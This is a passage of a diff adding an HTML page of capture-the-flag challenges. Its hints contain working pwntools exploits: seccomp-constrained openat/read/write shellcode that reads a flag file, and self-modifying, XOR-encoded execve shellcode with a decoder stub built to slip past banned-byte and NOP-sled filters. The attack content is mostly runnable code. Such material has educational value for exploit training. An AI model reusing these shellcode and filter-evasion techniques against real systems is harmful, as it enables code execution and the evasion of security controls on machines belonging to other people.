+# After mprotect: shellcode follows on the stack
+payload += shellcode
+
+p.sendafter(b'> ', payload)
+p.interactive()</code></pre>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Shellcode Sandbox</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Heavy seccomp: only <code>read</code>, <code>write</code>, <code>openat</code>, and <code>exit</code> are allowed. No <code>open</code>, no <code>execve</code>. Read the flag using <code>openat(AT_FDCWD, "/flag", O_RDONLY)</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># seccomp-tools dump output:
+# Allow: read(0), write(1), openat(257), exit(60), exit_group(231)
+# Everything else: KILL
+# Note: open(2) is blocked! Must use openat(2, ...) instead.</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><code>openat</code> syscall number is 257. Use <code>openat(AT_FDCWD, "/flag", O_RDONLY)</code> where <code>AT_FDCWD = -100</code> (0xffffffffffffff9c). This is equivalent to <code>open("/flag", 0)</code> but uses a different syscall number.</p>
+<pre><code class="language-python">from pwn import *
+context.arch = 'amd64'
+
+shellcode = asm('''
+    /* openat(AT_FDCWD, "/flag", O_RDONLY) */
+    mov     rdi, -100           /* AT_FDCWD */
+    lea     rsi, [rip + flag]
+    xor     edx, edx            /* O_RDONLY */
+    mov     eax, 257            /* openat */
+    syscall
+
+    /* read(fd, rsp-0x100, 0x100) */
+    mov     edi, eax
+    sub     rsp, 0x100
+    mov     rsi, rsp
+    mov     edx, 0x100
+    xor     eax, eax            /* read */
+    syscall
+
+    /* write(1, buf, bytes_read) */
+    mov     edx, eax
+    mov     edi, 1
+    mov     rsi, rsp
+    mov     eax, 1              /* write */
+    syscall
+
+    /* exit(0) */
+    xor     edi, edi
+    mov     eax, 60
+    syscall
+
+flag:
+    .asciz "/flag"
+''')
+
+p = remote('challenge.ctf', 1337)
+p.send(shellcode)
+print(p.recvall())</code></pre>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Shellcode Obfuscation Gauntlet</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The binary rejects shellcode containing any of: <code>0x0f05</code> (syscall), <code>0xcd80</code> (int 0x80), <code>0x050f</code> (reverse), null bytes, AND runs a NOP-sled detector (rejects &gt;4 consecutive <code>0x90</code> bytes). Get a shell.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># All prohibited patterns:
+BANNED = [b'\x0f\x05', b'\xcd\x80', b'\x05\x0f', b'\x00',
+          b'\x90\x90\x90\x90\x90']</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Combine multiple techniques: (1) Self-modifying code to construct <code>0f 05</code> at runtime, (2) XOR-encode the payload to eliminate null bytes and banned patterns, (3) Use diverse NOP-equivalents instead of <code>0x90</code> (e.g., <code>xchg rax,rax</code> = <code>48 87 c0</code>, <code>lea rsi,[rsi]</code>, <code>push rax; pop rax</code>). The decoder stub must itself be clean — no banned bytes.</p>
+<pre><code class="language-python">from pwn import *
+context.arch = 'amd64'
+
+# Step 1: Write clean shellcode with placeholder for syscall
+inner = asm('''
+    xor     esi, esi
+    mul     esi
+    push    rax
+    mov     rdi, 0x68732f2f6e69622f
+    push    rdi
+    push    rsp
+    pop     rdi
+    mov     al, 59
+    /* placeholder patched at runtime */
+    lea     rbx, [rip + .sc]
+    mov     byte ptr [rbx], 0x0e
+    inc     byte ptr [rbx]     /* 0x0e + 1 = 0x0f */
+    mov     byte ptr [rbx+1], 0x05
+.sc:
+    .byte   0x41, 0x41         /* patched to 0f 05 */
+''')
+
+# Step 2: XOR-encode to remove remaining bad bytes
+key = 0x37
+encoded = bytes([b ^ key for b in inner])
+assert b'\x00' not in encoded
+
+# Step 3: Build decoder (all clean bytes)
+decoder = asm(f'''
+    jmp     .e
+.d:
+    pop     rsi
+    mov     cl, {len(encoded)}
+.l:
+    xor     byte ptr [rsi + rcx - 1], {key}
+    loop    .l
+    jmp     rsi
+.e:
+    call    .d
+''')
+
+final = decoder + encoded
+for pat in [b'\x0f\x05', b'\xcd\x80', b'\x00']:
+    assert pat not in final, f"Banned pattern found!"
+log.success(f"Clean payload: {len(final)} bytes")</code></pre>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+</body>
+</html>
